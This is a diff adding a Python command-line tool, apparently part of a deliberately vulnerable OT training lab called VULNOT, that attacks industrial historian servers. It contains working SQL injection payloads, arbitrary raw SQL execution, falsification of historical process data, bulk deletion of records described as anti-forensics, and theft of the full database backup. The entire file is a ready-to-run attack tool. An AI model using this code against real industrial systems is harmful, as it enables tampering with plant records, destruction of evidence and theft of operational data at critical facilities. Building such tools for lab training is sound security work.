@@ -1,0 +1,351 @@
+#!/usr/bin/env python3
+"""
+VULNOT Historian Attack Tools
+Tools for attacking OT historian systems
+
+Attack Capabilities:
+- SQL injection
+- Data exfiltration
+- Historical data manipulation
+- Data deletion (anti-forensics)
+- Backup theft
+"""
+
+import argparse
+import json
+import sys
+import time
+import requests
+from typing import Optional
+from rich.console import Console
+from rich.table import Table
+from rich.panel import Panel
+from rich.prompt import Confirm
+
+console = Console()
+
+
+def cmd_enum(args):
+    """Enumerate historian tags and data"""
+    console.print("\n[bold cyan]╔════════════════════════════════════════╗[/]")
+    console.print("[bold cyan]║      VULNOT Historian Enumeration      ║[/]")
+    console.print("[bold cyan]╚════════════════════════════════════════╝[/]\n")
+    
+    base_url = f"http://{args.target}:{args.port}"
+    console.print(f"[yellow]Target: {base_url}[/]\n")
+    
+    try:
+        # Get all tags
+        resp = requests.get(f"{base_url}/api/tags", timeout=10)
+        data = resp.json()
+        
+        console.print(f"[green]Found {data['count']} tags![/]\n")
+        
+        table = Table(title="Historian Tags")
+        table.add_column("ID", style="cyan")
+        table.add_column("Name", style="white")
+        table.add_column("Type", style="yellow")
+        table.add_column("Source", style="green")
+        table.add_column("Value", style="magenta")
+        
+        for tag in data['tags'][:20]:  # First 20
+            table.add_row(
+                str(tag['id']),
+                tag['name'],
+                tag['data_type'],
+                tag['source'],
+                f"{tag['current_value']:.2f}" if isinstance(tag['current_value'], float) else str(tag['current_value'])
+            )
+            
+        console.print(table)
+        
+        if data['count'] > 20:
+            console.print(f"\n[dim]... and {data['count'] - 20} more tags[/]")
+            
+    except Exception as e:
+        console.print(f"[red]Error: {e}[/]")
+
+
+def cmd_sqli(args):
+    """SQL injection attack"""
+    console.print("\n[bold red]╔════════════════════════════════════════╗[/]")
+    console.print("[bold red]║      VULNOT Historian SQL Injection    ║[/]")
+    console.print("[bold red]║   ⚠️  EXPLOITS VULNERABLE ENDPOINT      ║[/]")
+    console.print("[bold red]╚════════════════════════════════════════╝[/]\n")
+    
+    base_url = f"http://{args.target}:{args.port}"
+    
+    payloads = {
+        'union_tags': "' UNION SELECT id, name, description, data_type, engineering_units, source FROM tags--",
+        'union_all': "' UNION SELECT 1,2,3,4,5,6--",
+        'dump_history': "' OR '1'='1",
+        'table_enum': "' UNION SELECT name, sql, '', '', '', '' FROM sqlite_master WHERE type='table'--",
+    }
+    
+    if args.payload:
+        payload = args.payload
+    else:
+        console.print("[yellow]Predefined payloads:[/]")
+        for name, p in payloads.items():
+            console.print(f"  [cyan]{name}[/]: {p[:50]}...")
+        payload = payloads.get(args.type, payloads['dump_history'])
+        
+    console.print(f"\n[yellow]Payload: {payload}[/]\n")
+    
+    if not args.force:
+        if not Confirm.ask("[bold red]Execute SQL injection?[/]"):
+            console.print("[yellow]Aborted[/]")
+            return
+    
+    try:
+        # Via history endpoint
+        resp = requests.get(
+            f"{base_url}/api/history",
+            params={"tag": payload},
+            timeout=10
+        )
+        
+        console.print(f"[green]Response status: {resp.status_code}[/]")
+        
+        try:
+            data = resp.json()
+            if 'error' in data:
+                console.print(f"[yellow]SQL Error (info disclosure): {data['error']}[/]")
+            else:
+                console.print(f"[green]Retrieved {data.get('count', 0)} records[/]")
+                if data.get('data'):
+                    console.print(json.dumps(data['data'][:5], indent=2))
+        except:
+            console.print(f"[yellow]Raw response: {resp.text[:500]}[/]")
+            
+    except Exception as e:
+        console.print(f"[red]Error: {e}[/]")
+
+
+def cmd_raw_query(args):
+    """Execute raw SQL query"""
+    console.print("\n[bold red]╔════════════════════════════════════════╗[/]")
+    console.print("[bold red]║      VULNOT Raw SQL Query Execution    ║[/]")
+    console.print("[bold red]║   ⚠️  EXTREME DANGER                    ║[/]")
+    console.print("[bold red]╚════════════════════════════════════════╝[/]\n")
+    
+    base_url = f"http://{args.target}:{args.port}"
+    
+    console.print(f"[yellow]Query: {args.query}[/]\n")
+    
+    if not args.force:
+        if not Confirm.ask("[bold red]Execute raw SQL query?[/]"):
+            console.print("[yellow]Aborted[/]")
+            return
+    
+    try:
+        resp = requests.post(
+            f"{base_url}/api/query",
+            json={"query": args.query},
+            timeout=10
+        )
+        
+        data = resp.json()
+        
+        if 'columns' in data:
+            table = Table(title="Query Results")
+            for col in data['columns']:
+                table.add_column(col, style="cyan")
+            for row in data['rows'][:20]:
+                table.add_row(*[str(v) for v in row])
+            console.print(table)
+        else:
+            console.print(f"[green]Affected rows: {data.get('affected_rows', 'N/A')}[/]")
+            
+    except Exception as e:
+        console.print(f"[red]Error: {e}[/]")
+
+
+def cmd_inject(args):
+    """Inject false historical data"""
+    console.print("\n[bold red]╔════════════════════════════════════════╗[/]")
+    console.print("[bold red]║      VULNOT Historical Data Injection  ║[/]")
+    console.print("[bold red]║   ⚠️  FALSIFIES HISTORIAN RECORDS       ║[/]")
+    console.print("[bold red]╚════════════════════════════════════════╝[/]\n")
+    
+    base_url = f"http://{args.target}:{args.port}"
+    
+    console.print(f"[yellow]Tag ID: {args.tag_id}[/]")
+    console.print(f"[yellow]Value: {args.value}[/]")
+    console.print(f"[yellow]Timestamp: {args.timestamp or 'now'}[/]\n")
+    
+    if not args.force:
+        if not Confirm.ask("[bold red]Inject false data?[/]"):
+            console.print("[yellow]Aborted[/]")
+            return
+    
+    try:
+        payload = {
+            "tag_id": args.tag_id,
+            "value": args.value,
+            "quality": args.quality,
+        }
+        if args.timestamp:
+            payload["timestamp"] = float(args.timestamp)
+            
+        resp = requests.post(
+            f"{base_url}/api/history",
+            json=payload,
+            timeout=10
+        )
+        
+        data = resp.json()
+        console.print(f"[red]✓ Data injected: {data}[/]")
+        
+    except Exception as e:
+        console.print(f"[red]Error: {e}[/]")
+
+
+def cmd_delete(args):
+    """Delete historical data (anti-forensics)"""
+    console.print("\n[bold red]╔════════════════════════════════════════╗[/]")
+    console.print("[bold red]║      VULNOT Historical Data Deletion   ║[/]")
+    console.print("[bold red]║   ⚠️  DESTROYS EVIDENCE                 ║[/]")
+    console.print("[bold red]╚════════════════════════════════════════╝[/]\n")
+    
+    base_url = f"http://{args.target}:{args.port}"
+    
+    console.print(Panel(
+        f"[bold red]This will DELETE historical data![/]\n\n"
+        f"Tag: {args.tag}\n"
+        f"Start: {args.start}\n"
+        f"End: {args.end}\n\n"
+        "Deleted data cannot be recovered!",
+        title="⚠️ DATA DELETION",
+        border_style="red"
+    ))
+    
+    if not args.force:
+        if not Confirm.ask("\n[bold red]DELETE historical data?[/]"):
+            console.print("[yellow]Aborted[/]")
+            return
+    
+    try:
+        resp = requests.delete(
+            f"{base_url}/api/history",
+            params={
+                "tag": args.tag,
+                "start": args.start,
+                "end": args.end,
+            },
+            timeout=10
+        )
+        
+        data = resp.json()
+        console.print(f"[red]✓ Deleted {data.get('count', 0)} records[/]")
+        
+    except Exception as e:
+        console.print(f"[red]Error: {e}[/]")
+
+
+def cmd_exfil(args):
+    """Exfiltrate historian database"""
+    console.print("\n[bold red]╔════════════════════════════════════════╗[/]")
+    console.print("[bold red]║      VULNOT Historian Data Exfil       ║[/]")
+    console.print("[bold red]║   ⚠️  STEALS COMPLETE DATABASE          ║[/]")
+    console.print("[bold red]╚════════════════════════════════════════╝[/]\n")
+    
+    base_url = f"http://{args.target}:{args.port}"
+    
+    console.print(f"[yellow]Target: {base_url}[/]")
+    console.print(f"[yellow]Output: {args.output}[/]\n")
+    
+    if not args.force:
+        if not Confirm.ask("[bold red]Download complete database?[/]"):
+            console.print("[yellow]Aborted[/]")
+            return
+    
+    try:
+        resp = requests.get(f"{base_url}/api/backup", timeout=30, stream=True)
+        
+        with open(args.output, 'wb') as f:
+            for chunk in resp.iter_content(chunk_size=8192):
+                f.write(chunk)
+                
+        console.print(f"[red]✓ Database exfiltrated to: {args.output}[/]")
+        console.print(f"[red]✓ Contains all historical process data![/]")
+        
+    except Exception as e:
+        console.print(f"[red]Error: {e}[/]")
+
+
+def main():
+    parser = argparse.ArgumentParser(
+        description='VULNOT Historian Attack Tools',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  vulnot-historian enum -t 10.0.9.10
+  vulnot-historian sqli -t 10.0.9.10 --type dump_history
+  vulnot-historian raw-query -t 10.0.9.10 -q "SELECT * FROM tags"
+  vulnot-historian inject -t 10.0.9.10 --tag-id 30 --value 150.0
+  vulnot-historian delete -t 10.0.9.10 --tag "REACTOR.TEMP" --start 0 --end 9999999999
+  vulnot-historian exfil -t 10.0.9.10 -o stolen_historian.db
+        """
+    )
+    
+    parser.add_argument('-t', '--target', default='10.0.9.10', help='Target IP')
+    parser.add_argument('-p', '--port', type=int, default=8080, help='Port')
+    
+    subparsers = parser.add_subparsers(dest='command')
+    
+    # Enumerate
+    subparsers.add_parser('enum', help='Enumerate tags')
+    
+    # SQL Injection
+    sqli = subparsers.add_parser('sqli', help='SQL injection')
+    sqli.add_argument('--type', default='dump_history', 
+                      choices=['union_tags', 'union_all', 'dump_history', 'table_enum'])
+    sqli.add_argument('--payload', help='Custom payload')
+    sqli.add_argument('--force', action='store_true')
+    
+    # Raw Query
+    raw = subparsers.add_parser('raw-query', help='Execute raw SQL')
+    raw.add_argument('-q', '--query', required=True, help='SQL query')
+    raw.add_argument('--force', action='store_true')
+    
+    # Inject
+    inj = subparsers.add_parser('inject', help='Inject false data')
+    inj.add_argument('--tag-id', type=int, required=True, help='Tag ID')
+    inj.add_argument('--value', type=float, required=True, help='Value')
+    inj.add_argument('--timestamp', help='Unix timestamp')
+    inj.add_argument('--quality', default='GOOD', help='Quality code')
+    inj.add_argument('--force', action='store_true')
+    
+    # Delete
+    delete = subparsers.add_parser('delete', help='Delete history')
+    delete.add_argument('--tag', required=True, help='Tag name')
+    delete.add_argument('--start', required=True, help='Start timestamp')
+    delete.add_argument('--end', required=True, help='End timestamp')
+    delete.add_argument('--force', action='store_true')
+    
+    # Exfiltrate
+    exfil = subparsers.add_parser('exfil', help='Exfiltrate database')
+    exfil.add_argument('-o', '--output', default='historian.db', help='Output file')
+    exfil.add_argument('--force', action='store_true')
+    
+    args = parser.parse_args()
+    
+    if args.command == 'enum':
+        cmd_enum(args)
+    elif args.command == 'sqli':
+        cmd_sqli(args)
+    elif args.command == 'raw-query':
+        cmd_raw_query(args)
+    elif args.command == 'inject':
+        cmd_inject(args)
+    elif args.command == 'delete':
+        cmd_delete(args)
+    elif args.command == 'exfil':
+        cmd_exfil(args)
+    else:
+        parser.print_help()
+
+
+if __name__ == '__main__':
+    main()
